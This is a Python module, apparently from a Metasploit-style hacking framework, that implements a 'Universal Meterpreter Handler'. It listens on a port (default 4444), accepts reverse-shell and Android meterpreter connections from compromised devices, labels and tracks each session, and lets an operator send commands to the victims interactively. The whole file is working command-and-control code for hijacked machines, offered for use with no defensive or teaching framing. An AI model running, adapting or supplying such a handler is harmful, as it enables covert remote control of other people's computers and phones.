import socket
import threading
import json
import re
from datetime import datetime
from rich.table import Table

MODULE_INFO = {
    "name": "Universal Meterpreter Handler",
    "description": "Unified handler with different functions per payload type",
    "author": "LazyHacker",
    "rank": "Excellent",
    "dependencies": []
}

OPTIONS = {
    "LHOST": {"description": "Bind address", "required": True, "default": "0.0.0.0"},
    "LPORT": {"description": "Bind port", "required": True, "default": 4444},
    "PAYLOAD": {"description": "Expected payload (any, reverse_tcp, android_meterpreter)", "required": False, "default": "any"}
}

# === GLOBAL SESSION ===
sessions = {}
session_lock = threading.Lock()
next_id = 1

class Session:
    def __init__(self, id, conn, addr, console):
        self.id = id
        self.conn = conn
        self.addr = addr
        self.console = console
        self.info = {"type": "unknown", "opened": datetime.now().strftime("%H:%M:%S")}
        self.alive = True

    def send(self, data):
        try: self.conn.send(data.encode())
        except: self.alive = False

    def recv(self, timeout=0.5):
        try:
            self.conn.settimeout(timeout)
            return self.conn.recv(4096).decode(errors='ignore')
        except:
            return ""
        finally:
            self.conn.settimeout(None)

def identify_payload(conn):
    try:
        conn.settimeout(3)
        banner = conn.recv(1024).decode(errors='ignore')
        conn.settimeout(None)
        if "REVERSE_TCP" in banner.upper():
            return "reverse_tcp", banner
        elif "ANDROID_METERPRETER" in banner.upper():
            return "android_meterpreter", banner
        elif "ANDROID_REV_TCP" in banner.upper():
            return "android_reverse_tcp", banner
        else:
            return "generic", banner[:100]
    except:
        return "unknown", ""

def handle_reverse_tcp(sess):
    sess.console.print("[*] [bold yellow]Interactive Shell Mode[/] (type 'exit' to return)")
    while sess.alive:
        try:
            cmd = sess.console.input("[bold yellow]shell > [/]")
            if cmd in ["exit", "back"]: break
            if not cmd.strip(): continue
            sess.send(cmd + "\n")
            resp = sess.recv(10)
            if resp: sess.console.print(resp.strip())
        except:
            break
    sess.console.print("[*] Shell session ended")

def handle_meterpreter(sess):
    while sess.alive:
        try:
            cmd = sess.console.input(f"[bold cyan]meterpreter ({sess.id}) > [/]")
            if cmd in ["back", "exit"]: break
            if not cmd.strip(): continue
            sess.send(cmd + "\n")
            resp = sess.recv()
            if resp: sess.console.print(resp.strip())
        except:
            break

def handle_generic(sess):
    while sess.alive:
        try:
            cmd = sess.console.input(f"[bold white]generic ({sess.id}) > [/]")
            if cmd in ["back", "exit"]: break
            sess.send(cmd + "\n")
            resp = sess.recv()
            if resp: sess.console.print(resp.strip())
        except:
            break

def handle_session(sess):
    ptype, banner = identify_payload(sess.conn)
    sess.info["type"] = ptype
    sess.info["banner"] = banner

    expected = sess.info.get("expected_payload", "any").lower()
    if expected != "any" and expected != ptype.lower():
        sess.console.print(f"[red][-] Payload mismatch: expected {expected}, got {ptype}[/red]")
        sess.conn.close()
        sess.alive = False
        return

    sess.console.print(f"[green][+] Session {sess.id} [{ptype.upper()}] from {sess.addr[0]}[/green]")
    if banner: sess.console.print(f"    [dim]{banner.strip()}[/dim]")

    # PILIH FUNGSI BERDASARKAN TYPE
    if ptype == "reverse_tcp":
        handle_reverse_tcp(sess)
    elif ptype == "android_meterpreter":
        handle_meterpreter(sess)
    else:
        handle_generic(sess)

    sess.alive = False
    sess.console.print(f"[red][-] Session {sess.id} closed[/red]")

def list_sessions(console):
    if not sessions:
        console.print("[yellow]No active sessions[/yellow]")
        return
    table = Table(title="Active Sessions")
    table.add_column("ID", style="bold")
    table.add_column("Type")
    table.add_column("From")
    table.add_column("Opened")
    for sid, s in sessions.items():
        if s.alive:
            table.add_row(str(sid), s.info["type"], str(s.addr[0]), s.info["opened"])
    console.print(table)

def run(session, options):
    global next_id
    console = session.console

    LHOST = options.get("LHOST", {}).get("value", "0.0.0.0")
    LPORT = int(options.get("LPORT", {}).get("value", 4444))
    expected_payload = options.get("PAYLOAD", {}).get("value", "any").lower()

    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((LHOST, LPORT))
        server.listen(10)
        console.print(f"[*] Handler listening on {LHOST}:{LPORT}")
        if expected_payload != "any":
            console.print(f"    [dim]Expecting: {expected_payload}[/dim]")
    except Exception as e:
        console.print(f"[red][!] Bind error: {e}[/red]")
        return

    def accepter():
        global next_id
        while True:
            try:
                conn, addr = server.accept()
                with session_lock:
                    sid = next_id
                    sess = Session(sid, conn, addr, console)  # PASS CONSOLE
                    sess.info["expected_payload"] = expected_payload
                    sessions[sid] = sess
                    next_id += 1
                threading.Thread(target=handle_session, args=(sess,), daemon=True).start()
            except:
                break

    t = threading.Thread(target=accepter, daemon=True)
    t.start()

    try:
        while True:
            cmd = console.input("[bold green]handler > [/]")
            if cmd == "sessions":
                list_sessions(console)
            elif cmd.startswith("interact "):
                try:
                    _, sid = cmd.split()
                    interact(int(sid), console)
                except:
                    console.print("[red]Invalid ID[/red]")
            elif cmd == "exit":
                break
    except KeyboardInterrupt:
        pass
    finally:
        server.close()
        console.print("[yellow]Handler stopped[/yellow]")

def interact(sid, console):
    with session_lock:
        if sid not in sessions or not sessions[sid].alive:
            console.print(f"[red]Session {sid} not active[/red]")
            return
        sess = sessions[sid]
    console.print(f"[*] Interacting with {sess.info['type']} ({sid})")
    while True:
        cmd = console.input(f"[bold red]{sess.info['type']} ({sid}) > [/]")
        if cmd in ["back", "exit"]: break
        sess.send(cmd + "\n")
        resp = sess.recv()
        if resp: console.print(resp.strip())
